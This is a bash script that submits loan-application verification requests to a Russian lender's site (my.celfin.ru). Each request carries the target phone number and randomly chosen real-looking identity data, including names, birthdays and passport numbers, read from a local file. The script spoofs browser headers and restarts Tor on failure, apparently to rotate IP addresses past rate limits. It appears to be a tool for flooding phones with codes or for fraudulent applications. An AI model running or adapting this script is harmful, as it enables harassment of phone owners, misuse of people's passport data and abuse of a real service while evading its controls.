#!/bin/bash

PHONE="$(echo "$1" | sed -E 's/^\+7([0-9]{3})([0-9]{3})([0-9]{2})([0-9]{2})$/7 (\1)-\2-\3-\4/' )"
INFO="$(cat personal.txt | shuf | head -1)"
LASTNAME="$(echo "$INFO" | cut -f1  |jq -sRr @uri)"
FIRSTNAME="$(echo "$INFO" | cut -f2  |jq -sRr @uri)"
MIDDLENAME="$(echo "$INFO" | cut -f3  |jq -sRr @uri)"
BIRTHDAY="$(echo "$INFO" | cut -f4)"
PASSPORT="$(echo "$INFO" | cut -f5)"
echo "$PHONE $INFO"

RESULT=$(curl -s --retry 3 'https://my.celfin.ru/assets/template/ajax/getCodeOPP.php' \
  -H 'authority: my.celfin.ru' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
  -H 'dnt: 1' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.50 Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'origin: https://my.celfin.ru' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://my.celfin.ru/?creditproduct=%D0%A6%D0%95%D0%9B%D0%95%D0%92%D0%9E%D0%99+0%2C85%28%D0%9B%D0%9A%29+6%D0%9C&amount=100000&interval=6' \
  -H 'accept-language: ru-UA,ru;q=0.9' \
  --data-raw 'action=getCodeOPP&ctx=celfin&phone=%2B'"$PHONE"'&last_name='"$LASTNAME"'&first_name='"$FIRSTNAME"'&middle_name='"$MIDDLENAME"'&birthday='"$BIRTHDAY"'&passportID='"$PASSPORT" \
  --compressed)

echo "$RESULT"

if [ "$RESULT" != '{"code":true}' ]; then
  echo "fail"
  pkill -sighup tor 2>/dev/null
fi
